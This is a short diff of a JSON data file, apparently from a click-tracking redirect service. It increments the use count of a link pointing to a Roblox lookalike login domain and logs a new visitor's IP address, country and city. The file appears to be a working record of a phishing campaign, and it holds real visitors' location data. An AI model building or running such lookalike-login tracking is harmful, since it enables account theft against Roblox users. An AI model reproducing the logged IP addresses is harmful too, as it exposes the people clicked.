@@ -166,7 +166,7 @@
     "targetUrl": "https://roblox.com.ge/login?returnUrl=0920460288224362",
     "createdAt": 1776592397121,
     "status": "active",
-    "useCount": 1377,
+    "useCount": 1378,
     "createdBy": "admin",
     "clicks": [
       {
@@ -11184,6 +11184,14 @@
         "city": "Rochester",
         "flag": "🇺🇸",
         "countryCode": "US"
+      },
+      {
+        "timestamp": 1777421822973,
+        "ip": "179.193.7.182",
+        "country": "Brazil",
+        "city": "Jundiaí",
+        "flag": "🇧🇷",
+        "countryCode": "BR"
       }
     ]
   },
